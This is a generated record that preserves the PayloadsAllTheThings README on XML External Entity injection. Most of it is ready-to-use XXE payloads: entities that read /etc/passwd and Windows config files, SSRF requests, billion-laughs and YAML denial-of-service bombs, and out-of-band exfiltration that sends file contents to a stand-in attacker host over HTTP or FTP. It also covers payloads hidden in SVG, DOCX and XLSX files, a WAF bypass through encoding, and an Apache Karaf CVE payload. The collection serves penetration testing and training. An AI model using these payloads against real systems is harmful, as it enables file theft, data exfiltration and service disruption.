---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# XML External Entity

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-xxe-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XXE Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [XML External Entity](../../topics/xxe-injection/xml-external-entity.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-xxe-injection-readme |
| name | XML External Entity |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md |

## Preserved Source Material

````yaml
_body: "# XML External Entity\n\n> An XML External Entity attack is a type of attack against an application that parses XML\
  \ input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.\n\
  \n## Summary\n\n- [Tools](#tools)\n- [Detect The Vulnerability](#detect-the-vulnerability)\n- [Exploiting XXE to Retrieve\
  \ Files](#exploiting-xxe-to-retrieve-files)\n    - [Classic XXE](#classic-xxe)\n    - [Classic XXE Base64 Encoded](#classic-xxe-base64-encoded)\n\
  \    - [PHP Wrapper Inside XXE](#php-wrapper-inside-xxe)\n    - [XInclude Attacks](#xinclude-attacks)\n- [Exploiting XXE\
  \ to Perform SSRF Attacks](#exploiting-xxe-to-perform-ssrf-attacks)\n- [Exploiting XXE to Perform a Denial of Service](#exploiting-xxe-to-perform-a-denial-of-service)\n\
  \    - [Billion Laugh Attack](#billion-laugh-attack)\n    - [YAML Attack](#yaml-attack)\n    - [Parameters Laugh Attack](#parameters-laugh-attack)\n\
  - [Exploiting Error Based XXE](#exploiting-error-based-xxe)\n    - [Error Based - Using Local DTD File](#error-based---using-local-dtd-file)\n\
  \        - [Linux Local DTD](#linux-local-dtd)\n        - [Windows Local DTD](#windows-local-dtd)\n    - [Error Based -\
  \ Using Remote DTD](#error-based---using-remote-dtd)\n- [Exploiting Blind XXE to Exfiltrate Data Out Of Band](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)\n\
  \    - [Basic Blind XXE](#basic-blind-xxe)\n    - [Out of Band XXE](#out-of-band-xxe)\n    - [XXE OOB with DTD and PHP Filter](#xxe-oob-with-dtd-and-php-filter)\n\
  \    - [XXE OOB with Apache Karaf](#xxe-oob-with-apache-karaf)\n- [WAF Bypasses](#waf-bypasses)\n    - [Bypass via Character\
  \ Encoding](#bypass-via-character-encoding)\n    - [XXE on JSON Endpoints](#xxe-on-json-endpoints)\n- [XXE in Exotic Files](#xxe-in-exotic-files)\n\
  \    - [XXE Inside SVG](#xxe-inside-svg)\n    - [XXE Inside SOAP](#xxe-inside-soap)\n    - [XXE Inside DOCX file](#xxe-inside-docx-file)\n\
  \    - [XXE Inside XLSX file](#xxe-inside-xlsx-file)\n    - [XXE Inside DTD file](#xxe-inside-dtd-file)\n- [Labs](#labs)\n\
  - [References](#references)\n\n## Tools\n\n- [staaldraad/xxeftp](https://github.com/staaldraad/xxeserv) - A mini webserver\
  \ with FTP support for XXE payloads\n- [lc/230-OOB](https://github.com/lc/230-OOB) - An Out-of-Band XXE server for retrieving\
  \ file contents over FTP and payload generation via [http://xxe.sh/](http://xxe.sh/)\n- [enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector)\
  \ - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods\n- [BuffaloWill/oxml_xxe](https://github.com/BuffaloWill/oxml_xxe)\
  \ - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG,\
  \ GIF)\n- [whitel1st/docem](https://github.com/whitel1st/docem) - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc\n\
  - [bytehope/wwe](https://github.com/bytehope/wwe) - PoC tool (based on wrapwrap & lightyear ) to demonstrate XXE in PHP\
  \ with only LIBXML_DTDLOAD or LIBXML_DTDATTR flag set\n\n## Detect The Vulnerability\n\n**Internal Entity**: If an entity\
  \ is declared within a DTD it is called an internal entity.\nSyntax: `<!ENTITY entity_name \"entity_value\">`\n\n**External\
  \ Entity**: If an entity is declared outside a DTD it is called an external entity. Identified by `SYSTEM`.\nSyntax: `<!ENTITY\
  \ entity_name SYSTEM \"entity_value\">`\n\nBasic entity test, when the XML parser parses the external entities the result\
  \ should contain \"John\" in `firstName` and \"Doe\" in `lastName`. Entities are defined inside the `DOCTYPE` element.\n\
  \n```xml\n<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]>\n <userInfo>\n  <firstName>John</firstName>\n\
  \  <lastName>&example;</lastName>\n </userInfo>\n```\n\nIt might help to set the `Content-Type: application/xml` in the\
  \ request when sending XML payload to the server.\n\nThese are different types of entities in XML:\n\n| Type           \
  \  | Prefix   | Where usable                |\n| ---------------- | -------- | --------------------------- |\n| General\
  \ entity   | `&name;` | Inside XML document content |\n| Parameter entity | `%name;` | Only inside the DTD         |\n\n\
  ## Exploiting XXE to Retrieve Files\n\n### Classic XXE\n\nWe try to display the content of the file `/etc/passwd`.\n\n```xml\n\
  <?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>\n```\n\n```xml\n\
  <?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ELEMENT data (#ANY)>\n<!ENTITY file SYSTEM \"file:///etc/passwd\">\n]>\n<data>&file;</data>\n\
  ```\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n  <!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe\
  \ SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>\n```\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE\
  \ foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>\n```\n\n:warning: `SYSTEM`\
  \ and `PUBLIC` are almost synonym.\n\n```ps1\n<!ENTITY % xxe PUBLIC \"Random Text\" \"URL\">\n<!ENTITY xxe PUBLIC \"Any\
  \ TEXT\" \"URL\">\n```\n\n### Classic XXE Base64 Encoded\n\n```xml\n<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"\
  > %init; ]><foo/>\n```\n\n### PHP Wrapper Inside XXE\n\n```xml\n<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"\
  > ]>\n<contacts>\n  <contact>\n    <name>Jean &xxe; Dupont</name>\n    <phone>00 11 22 33 44</phone>\n    <address>42 rue\
  \ du CTF</address>\n    <zipcode>75000</zipcode>\n    <city>Paris</city>\n  </contact>\n</contacts>\n```\n\n```xml\n<?xml\
  \ version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://10.0.0.3\"\
  \ >\n]>\n<foo>&xxe;</foo>\n```\n\n### XInclude Attacks\n\nWhen you can't modify the **DOCTYPE** element use the **XInclude**\
  \ to target\n\n```xml\n<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n<xi:include parse=\"text\" href=\"file:///etc/passwd\"\
  /></foo>\n```\n\n## Exploiting XXE to Perform SSRF Attacks\n\nXXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)\
  \ to target another service on the network.\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n\
  <!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://internal.service/secret_pass.txt\" >\n]>\n<foo>&xxe;</foo>\n```\n\n##\
  \ Exploiting XXE to Perform a Denial of Service\n\n:warning: : These attacks might kill the service or the server, do not\
  \ use them on the production.\n\n### Billion Laugh Attack\n\n```xml\n<!DOCTYPE data [\n<!ENTITY a0 \"dos\" >\n<!ENTITY a1\
  \ \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\">\n<!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\">\n<!ENTITY a3\
  \ \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\">\n<!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\">\n]>\n<data>&a4;</data>\n\
  ```\n\n### YAML Attack\n\n```xml\na: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\nb: &b\
  \ [*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\nd: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\ne: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]\n\
  f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]\ng: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]\nh: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]\ni: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]\n\
  ```\n\n### Parameters Laugh Attack\n\nA variant of the Billion Laughs attack, using delayed interpretation of parameter\
  \ entities, by Sebastian Pipping.\n\n```xml\n<!DOCTYPE r [\n  <!ENTITY % pe_1 \"<!---->\">\n  <!ENTITY % pe_2 \"&#37;pe_1;<!---->&#37;pe_1;\"\
  >\n  <!ENTITY % pe_3 \"&#37;pe_2;<!---->&#37;pe_2;\">\n  <!ENTITY % pe_4 \"&#37;pe_3;<!---->&#37;pe_3;\">\n  %pe_4;\n]>\n\
  <r/>\n```\n\n## Exploiting Error Based XXE\n\n### Error Based - Using Local DTD File\n\nIf error based exfiltration is possible,\
  \ you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.\n\
  \n```xml\n<!DOCTYPE root [\n    <!ENTITY % local_dtd SYSTEM \"file:///abcxyz/\">\n    %local_dtd;\n]>\n<root></root>\n```\n\
  \n- [GoSecure/dtd-finder](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md) - List DTDs and generate\
  \ XXE payloads using those local DTDs.\n\n#### Linux Local DTD\n\nShort list of DTD files already stored on Linux systems;\
  \ list them with `locate .dtd`:\n\n```xml\n/usr/share/xml/fontconfig/fonts.dtd\n/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd\n\
  /usr/share/xml/svg/svg10.dtd\n/usr/share/xml/svg/svg11.dtd\n/usr/share/yelp/dtd/docbookx.dtd\n```\n\nThe file `/usr/share/xml/fontconfig/fonts.dtd`\
  \ has an injectable entity `%constant` at line 148: `<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>`\n\
  \nThe final payload becomes:\n\n```xml\n<!DOCTYPE message [\n    <!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"\
  >\n    <!ENTITY % constant 'aaa)>\n            <!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">\n            <!ENTITY\
  \ &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>\">\n            &#x25;eval;\n  \
  \          &#x25;error;\n            <!ELEMENT aa (bb'>\n    %local_dtd;\n]>\n<message>Text</message>\n```\n\n#### Windows\
  \ Local DTD\n\nPayloads from [infosec-au/xxe-windows.md](https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79).\n\
  \n- Disclose local file\n\n  ```xml\n  <!DOCTYPE doc [\n      <!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\\
  wbem\\xml\\cim20.dtd\">\n      <!ENTITY % SuperClass '>\n          <!ENTITY &#x25; file SYSTEM \"file://D:\\webserv2\\services\\\
  web.config\">\n          <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>\">\n\
  \          &#x25;eval;\n          &#x25;error;\n        <!ENTITY test \"test\"'\n      >\n      %local_dtd;\n    ]><xxx>anything</xxx>\n\
  \  ```\n\n- Disclose HTTP Response\n\n  ```xml\n  <!DOCTYPE doc [\n      <!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\\
  System32\\wbem\\xml\\cim20.dtd\">\n      <!ENTITY % SuperClass '>\n          <!ENTITY &#x25; file SYSTEM \"https://erp.company.com\"\
  >\n          <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>\">\n       \
  \   &#x25;eval;\n          &#x25;error;\n        <!ENTITY test \"test\"'\n      >\n      %local_dtd;\n    ]><xxx>anything</xxx>\n\
  \  ```\n\n### Error Based - Using Remote DTD\n\n**Payload to trigger the XXE**:\n\n```xml\n<?xml version=\"1.0\" ?>\n<!DOCTYPE\
  \ message [\n    <!ENTITY % ext SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/ext.dtd\">\n    %ext;\n]>\n<message></message>\n```\n\
  \n**Content of ext.dtd**:\n\n```xml\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; error\
  \ SYSTEM 'file:///nonexistent/%file;'>\">\n%eval;\n%error;\n```\n\n**Alternative content of ext.dtd**:\n\n```xml\n<!ENTITY\
  \ % data SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; leak SYSTEM '%data;:///'>\">\n%eval;\n%leak;\n\
  ```\n\nLet's break down the payload:\n\n1. `<!ENTITY % file SYSTEM \"file:///etc/passwd\">`\n  This line defines an external\
  \ entity named file that references the content of the file /etc/passwd (a Unix-like system file containing user account\
  \ details).\n2. `<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">`\n  This line defines an\
  \ entity eval that holds another entity definition. This other entity (error) is meant to reference a nonexistent file and\
  \ append the content of the file entity (the `/etc/passwd` content) to the end of the file path. The `&#x25;` is a URL-encoded\
  \ '`%`' used to reference an entity inside an entity definition.\n3. `%eval;`\n  This line uses the eval entity, which causes\
  \ the entity error to be defined.\n4. `%error;`\n  Finally, this line uses the error entity, which attempts to access a\
  \ nonexistent file with a path that includes the content of `/etc/passwd`. Since the file doesn't exist, an error will be\
  \ thrown. If the application reports back the error to the user and includes the file path in the error message, then the\
  \ content of `/etc/passwd` would be disclosed as part of the error message, revealing sensitive information.\n\n## Exploiting\
  \ Blind XXE to Exfiltrate Data Out of Band\n\nSometimes you won't have a result outputted in the page but you can still\
  \ extract the data with an out of band attack.\n\n### Basic Blind XXE\n\nThe easiest way to test for a blind XXE is to try\
  \ to load a remote resource such as a callback endpoint controlled by the tester.\n\n```xml\n<?xml version=\"1.0\" ?>\n\
  <!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/x\"> %ext;\n]>\n<r></r>\n```\n\n```xml\n<!DOCTYPE\
  \ root [<!ENTITY test SYSTEM 'http://[ATTACKER.DOMAIN.TLD]'>]>\n<root>&test;</root>\n```\n\nSend the content of `/etc/passwd`\
  \ to `http://[ATTACKER.DOMAIN.TLD]`, you may receive only the first line.\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"\
  ?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY % xxe SYSTEM \"file:///etc/passwd\" >\n<!ENTITY callhome SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/?%xxe;\"\
  >\n]\n>\n<foo>&callhome;</foo>\n```\n\n### Out of Band XXE\n\n> Yunusov, 2013\n\n```xml\n<?xml version=\"1.0\" encoding=\"\
  utf-8\"?>\n<!DOCTYPE data SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd\">\n<data>&send;</data>\n\nFile\
  \ stored on http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd\n<!ENTITY % file SYSTEM \"file:///sys/power/image_size\"\
  >\n<!ENTITY % all \"<!ENTITY send SYSTEM 'http://[ATTACKER.DOMAIN.TLD]/?%file;'>\">\n%all;\n```\n\n### XXE OOB with DTD\
  \ and PHP Filter\n\n```xml\n<?xml version=\"1.0\" ?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM \"http://10.10.10.10/dtd.xml\"\
  >\n%sp;\n%param1;\n]>\n<r>&exfil;</r>\n\nFile stored on http://10.10.10.10/dtd.xml\n<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"\
  >\n<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://10.10.10.10/dtd.xml?%data;'>\">\n```\n\n### XXE OOB with Apache Karaf\n\
  \nCVE-2018-11788 affecting versions:\n\n- Apache Karaf <= 4.2.1\n- Apache Karaf <= 4.1.6\n\n```xml\n<?xml version=\"1.0\"\
  \ encoding=\"UTF-8\"?>\n<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://[ATTACKER.DOMAIN.TLD]\"> %dtd;]\n<features name=\"\
  my-features\" xmlns=\"http://karaf.apache.org/xmlns/features/v1.3.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
  \n        xsi:schemaLocation=\"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0\"\
  >\n    <feature name=\"deployer\" version=\"2.0\" install=\"auto\">\n    </feature>\n</features>\n```\n\nSend the XML file\
  \ to the `deploy` folder.\n\nRef. [brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)\n\n## WAF Bypasses\n\
  \n### Bypass via Character Encoding\n\nXML parsers uses 4 methods to detect encoding:\n\n- HTTP Content Type: `Content-Type:\
  \ text/xml; charset=utf-8`\n- Reading Byte Order Mark (BOM)\n- Reading first symbols of document\n    - UTF-8 (3C 3F 78\
  \ 6D)\n    - UTF-16BE (00 3C 00 3F)\n    - UTF-16LE (3C 00 3F 00)\n- XML declaration: `<?xml version=\"1.0\" encoding=\"\
  UTF-8\"?>`\n\n| Encoding | BOM      | Example                             |              |\n| -------- | -------- | -----------------------------------\
  \ | ------------ |\n| UTF-8    | EF BB BF | EF BB BF 3C 3F 78 6D 6C             | ...<?xml     |\n| UTF-16BE | FE FF   \
  \ | FE FF 00 3C 00 3F 00 78 00 6D 00 6C | ...<.?.x.m.l |\n| UTF-16LE | FF FE    | FF FE 3C 00 3F 00 78 00 6D 00 6C 00 |\
  \ ..<.?.x.m.l. |\n\n**Example**: We can convert the payload to `UTF-16` using [iconv](https://man7.org/linux/man-pages/man1/iconv.1.html)\
  \ to bypass some WAF:\n\n```bash\ncat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml\n```\n\n### XXE on\
  \ JSON Endpoints\n\nIn the HTTP request try to switch the `Content-Type` from **JSON** to **XML**,\n\n| Content Type   \
  \    | Data                               |\n| ------------------ | ---------------------------------- |\n| `application/json`\
  \ | `{\"search\":\"name\",\"value\":\"test\"}` |\n| `application/xml`  | `<?xml version=\"1.0\" encoding=\"UTF-8\" ?><root><search>name</search><value>data</value></root>`\
  \ |\n\n- XML documents must contain one root (`<root>`) element that is the parent of all other elements.\n- The data must\
  \ be converted to XML too, otherwise the server will respond with an error.\n\n```json\n{\n  \"errors\":{\n    \"errorMessage\"\
  :\"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.\"\n  }\n}\n```\n\n\
  - [NetSPI/Content-Type Converter](https://github.com/NetSPI/Burp-Extensions/releases/tag/1.4)\n\n## XXE in Exotic Files\n\
  \n### XXE Inside SVG\n\n```xml\n<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"\
  300\" version=\"1.1\" height=\"200\">\n    <image xlink:href=\"expect://ls\" width=\"200\" height=\"200\"></image>\n</svg>\n\
  ```\n\n**Classic**:\n\n```xml\n<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\"\
  \ > ]>\n<svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"\
  \ version=\"1.1\">\n   <text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text>\n</svg>\n```\n\n**OOB via SVG rasterization**:\n\
  \n_xxe.svg_:\n\n```xml\n<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE svg [\n<!ELEMENT svg ANY >\n<!ENTITY % sp\
  \ SYSTEM \"http://10.10.10.10:8080/xxe.xml\">\n%sp;\n%param1;\n]>\n<svg viewBox=\"0 0 200 200\" version=\"1.2\" xmlns=\"\
  http://www.w3.org/2000/svg\" style=\"fill:red\">\n      <text x=\"15\" y=\"100\" style=\"fill:black\">XXE via SVG rasterization</text>\n\
  \      <rect x=\"0\" y=\"0\" rx=\"10\" ry=\"10\" width=\"200\" height=\"200\" style=\"fill:pink;opacity:0.7\"/>\n      <flowRoot\
  \ font-size=\"15\">\n         <flowRegion>\n           <rect x=\"0\" y=\"0\" width=\"200\" height=\"200\" style=\"fill:red;opacity:0.3\"\
  />\n         </flowRegion>\n         <flowDiv>\n            <flowPara>&exfil;</flowPara>\n         </flowDiv>\n      </flowRoot>\n\
  </svg>\n```\n\n_xxe.xml_:\n\n```xml\n<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hostname\"\
  >\n<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'ftp://10.10.10.10:2121/%data;'>\">\n```\n\n### XXE Inside SOAP\n\n```xml\n\
  <soap:Body>\n  <foo>\n  <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://10.10.10.10:22/\"> %dtd;]><xxx/>]]>\n  </foo>\n\
  </soap:Body>\n```\n\n### XXE Inside DOCX file\n\nFormat of an Open XML file (inject the payload in any .xml file):\n\n-\
  \ /_rels/.rels\n- [Content_Types].xml\n- Default Main Document Part\n    - /word/document.xml\n    - /ppt/presentation.xml\n\
  \    - /xl/workbook.xml\n\nThen update the file `zip -u xxe.docx [Content_Types].xml`\n\nTool : <https://github.com/BuffaloWill/oxml_xxe>\n\
  \n```xml\nDOCX/XLSX/PPTX\nODT/ODG/ODP/ODS\nSVG\nXML\nPDF (experimental)\nJPG (experimental)\nGIF (experimental)\n```\n\n\
  ### XXE Inside XLSX file\n\nStructure of the XLSX:\n\n```ps1\n$ 7z l xxe.xlsx\n[...]\n   Date      Time    Attr        \
  \ Size   Compressed  Name\n------------------- ----- ------------ ------------  ------------------------\n2021-10-17 15:19:00\
  \ .....          578          223  _rels/.rels\n2021-10-17 15:19:00 .....          887          508  xl/workbook.xml\n2021-10-17\
  \ 15:19:00 .....         4451          643  xl/styles.xml\n2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml\n\
  2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels\n2021-10-17 15:19:00 .....          201\
  \          160  xl/sharedStrings.xml\n2021-10-17 15:19:00 .....          731          352  docProps/core.xml\n2021-10-17\
  \ 15:19:00 .....          410          246  docProps/app.xml\n2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml\n\
  ------------------- ----- ------------ ------------  ------------------------\n2021-10-17 15:19:00              11216  \
  \       3586  9 files\n```\n\nExtract Excel file: `7z x -oXXE xxe.xlsx`\n\nRebuild Excel file:\n\n```ps1\ncd XXE\nzip -r\
  \ -u ../xxe.xlsx *\n```\n\nWarning: Use `zip -u` (<https://infozip.sourceforge.net/Zip.html>) and not `7z u` / `7za u` (<https://p7zip.sourceforge.net/>)\
  \ or `7zz` (<https://www.7-zip.org/>) because they won't recompress it the same way and many Excel parsing libraries will\
  \ fail to recognize it as a valid Excel file. A valid  magic byte signature with (`file XXE.xlsx`) will be shown as `Microsoft\
  \ Excel 2007+` (with `zip -u`) and an invalid one will be shown as `Microsoft OOXML`. Alternatively, with 7z you can specify\
  \ the correct compression algorithm with: `7z a -tzip` to get the correct signature.\n\nAdd your blind XXE payload inside\
  \ `xl/workbook.xml`.\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE cdl [<!ELEMENT\
  \ cdl ANY ><!ENTITY % asd SYSTEM \"http://10.10.10.10:8000/xxe.dtd\">%asd;%c;]>\n<cdl>&rrr;</cdl>\n<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"\
  \ xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">\n```\n\nAlternatively, add your payload\
  \ in `xl/sharedStrings.xml`:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE cdl [<!ELEMENT\
  \ t ANY ><!ENTITY % asd SYSTEM \"http://10.10.10.10:8000/xxe.dtd\">%asd;%c;]>\n<sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"\
  \ count=\"10\" uniqueCount=\"10\"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>\n\
  ```\n\nUsing a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file.\n\
  Instead we build the document once and then change the DTD.\nAnd using FTP instead of HTTP allows to retrieve much larger\
  \ files.\n\n`xxe.dtd`\n\n```xml\n<!ENTITY % d SYSTEM \"file:///etc/passwd\">\n<!ENTITY % c \"<!ENTITY rrr SYSTEM 'ftp://10.10.10.10:2121/%d;'>\"\
  >\n```\n\nServe DTD and receive FTP payload using [staaldraad/xxeserv](https://github.com/staaldraad/xxeserv):\n\n```ps1\n\
  xxeserv -o files.log -p 2121 -w -wd public -wp 8000\n```\n\n### XXE Inside DTD file\n\nMost XXE payloads detailed above\
  \ require control over both the DTD or `DOCTYPE` block as well as the `xml` file.\nIn rare situations, you may only control\
  \ the DTD file and won't be able to modify the `xml` file. For example, a MITM.\nWhen all you control is the DTD file, and\
  \ you do not control the `xml` file, XXE may still be possible with this payload.\n\n```xml\n<!-- Load the contents of a\
  \ sensitive file into a variable -->\n<!ENTITY % payload SYSTEM \"file:///etc/passwd\">\n<!-- Use that variable to construct\
  \ an HTTP get request with the file contents in the URL -->\n<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/x=%payload;\"\
  >'>\n%param1;\n%external;\n```\n\n## Labs\n\n- [Root Me - XML External Entity](https://www.root-me.org/en/Challenges/Web-Server/XML-External-Entity)\n\
  - [PortSwigger Labs for XXE](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection)\n    - [Exploiting\
  \ XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)\n\
  \    - [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)\n\
  \    - [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)\n\
  \    - [Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)\n\
  \    - [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)\n\
  \    - [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)\n\
  \    - [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)\n    - [Exploiting\
  \ XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)\n    - [Exploiting XXE to\
  \ retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)\n\
  - [GoSecure workshop - Advanced XXE Exploitation](https://gosecure.github.io/xxe-workshop)\n\n## References\n\n- [A Deep\
  \ Dive into XXE Injection - Trenton Gordon - July 22, 2019](https://web.archive.org/web/20250511144639/https://www.synack.com/blog/a-deep-dive-into-xxe-injection/)\n\
  - [Automating local DTD discovery for XXE exploitation - Philippe Arteau - July 16, 2019](https://web.archive.org/web/20240119113458/https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/)\n\
  - [Blind OOB XXE At UBER 26+ Domains Hacked - Raghav Bisht - August 5, 2016](https://web.archive.org/web/20180215154806/https://nerdint.blogspot.hk:80/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html)\n\
  - [CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server - Julien Szlamowicz, Sebastien Dudek - March 11, 2019](https://web.archive.org/web/20191231121853/https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf)\n\
  - [Data exfiltration using XXE on a hardened server - Ritik Singh - January 29, 2022](https://web.archive.org/web/20221121024329/https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac)\n\
